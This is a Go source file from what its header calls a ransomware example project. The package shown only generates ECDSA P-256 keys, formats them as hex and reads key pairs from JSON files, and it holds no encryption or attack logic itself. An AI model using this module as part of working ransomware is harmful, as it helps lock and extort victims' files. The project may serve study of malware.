/*
Ransomware example in Golang
Copyright (C) 2017 Gustavo Henrique

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>
*/
package cryptography

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/big"
)

func GenerateECDSAPrivateKey() (*ecdsa.PrivateKey, error) {
	c := elliptic.P256()
	return ecdsa.GenerateKey(c, rand.Reader)
}

func ToHex(num *big.Int) string {
	hexstring := fmt.Sprintf("%x", num)
	if len(hexstring)%2 != 0 {
		hexstring = "0" + hexstring
	}
	return hexstring
}

func GetOrCreatePrivKey(ecdsaPrivKey *ecdsa.PrivateKey, file string) PrivKey {
	raw, err := ioutil.ReadFile(file)
	if err != nil {
		return PrivKey{D: ToHex(ecdsaPrivKey.D)}
	}
	var privKey PrivKey
	json.Unmarshal(raw, &privKey)
	return privKey
}

func GetOrCreatePubKey(ecdsaPrivKey *ecdsa.PrivateKey, file string) PubKey {
	raw, err := ioutil.ReadFile(file)
	if err != nil {
		return PubKey{X: ToHex(ecdsaPrivKey.PublicKey.X), Y: ToHex(ecdsaPrivKey.PublicKey.Y)}
	}
	var pubKey PubKey
	json.Unmarshal(raw, &pubKey)
	return pubKey
}
